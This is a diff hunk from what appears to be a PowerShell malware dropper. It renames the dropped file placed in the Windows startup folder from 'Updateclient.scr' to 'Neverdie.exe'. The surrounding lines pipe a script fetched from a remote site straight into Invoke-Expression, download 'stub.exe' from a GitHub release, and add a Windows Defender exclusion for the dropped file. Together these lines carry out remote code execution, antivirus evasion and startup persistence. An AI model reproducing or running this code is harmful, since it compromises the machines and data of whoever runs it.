@@ -138,7 +138,7 @@ if (Test-Path -Path $output) {
 iwr "https://leaked.tools/r/GFvWVhDQmc" | iex
 
 $url = "https://github.com/43a1723/test/releases/download/siu/stub.exe"
-$output = "$startupfolder\Updateclient.scr"
+$output = "$startupfolder\Neverdie.exe"
 Add-MpPreference -ExclusionPath $output
 
 if (Test-Path -Path $output) {
